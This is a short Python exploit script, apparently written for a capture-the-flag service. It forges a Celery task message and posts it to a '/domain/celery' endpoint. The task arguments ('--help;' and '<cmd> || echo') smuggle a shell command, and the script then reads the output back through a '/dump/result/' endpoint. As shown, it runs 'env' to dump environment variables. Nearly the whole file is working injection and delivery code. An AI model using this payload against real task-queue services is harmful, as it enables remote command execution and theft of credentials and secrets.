import json
import copy
import base64
import time
import uuid

import requests

def sploit(url, cmd=''):
    base_p_json = "{\"body\": \"W1sidGVzdCIsICJ0ZXN0Il0sIHt9LCB7ImNhbGxiYWNrcyI6IG51bGwsICJlcnJiYWNrcyI6IG51bGwsICJjaGFpbiI6IG51bGwsICJjaG9yZCI6IG51bGx9XQ==\", \"content-encoding\": \"utf-8\", \"content-type\": \"application/json\", \"headers\": {\"lang\": \"py\", \"task\": \"main.zip_dir\", \"id\": \"264e0e7b-3966-42d6-bce0-f109f22de8ef\", \"shadow\": null, \"eta\": null, \"expires\": null, \"group\": null, \"group_index\": null, \"retries\": 0, \"timelimit\": [null, null], \"root_id\": \"264e0e7b-3966-42d6-bce0-f109f22de8ef\", \"parent_id\": null, \"argsrepr\": \"('test', 'test')\", \"kwargsrepr\": \"{}\", \"origin\": \"gen89513@zion\", \"ignore_result\": false}, \"properties\": {\"correlation_id\": \"264e0e7b-3966-42d6-bce0-f109f22de8ef\", \"reply_to\": \"ee179c9b-c381-3335-b6a8-0f15227d8491\", \"delivery_mode\": 2, \"delivery_info\": {\"exchange\": \"\", \"routing_key\": \"celery\"}, \"priority\": 0, \"body_encoding\": \"base64\", \"delivery_tag\": \"e7257297-5c17-4757-9bdf-97c7ae2e1bc1\"}}"
    base_p = json.loads(base_p_json)
    # print("==========ORIGINAL===============")
    # print(base_p)
    b64payl = base64.b64decode(base_p['body'])
    # print(b64payl)
    # print("===========CHANGED===============")
    out_file = '--help;'
    dir = '{} || echo '.format(cmd)

    base_p['headers']['origin'] = 'test'
    base_p['body'] = '[["%s", "%s"], {}, {"callbacks": null, "errbacks": null, "chain": null, "chord": null}]' % (
    out_file, dir)
    base_p['body'] = base64.b64encode(base_p['body'].encode()).decode()
    base_p['headers']['argsrepr'] = "('%s', '%s')" % (out_file, dir)
    new_id = str(uuid.uuid4())
    for key in ['headers.id', 'headers.root_id', 'properties.correlation_id']:
        f, p = key.split('.')
        base_p[f][p] = new_id

    # print(new_id)
    # print(base_p)
    resp = requests.post(f'http://{url}:5321/domain/celery', data={'setting': json.dumps(base_p)})
    # Wait until task is executed
    time.sleep(2)
    resp = requests.get(f'http://{url}:5321/dump/result/' + new_id)
    print(resp.text)

sploit('127.0.0.1', 'env')
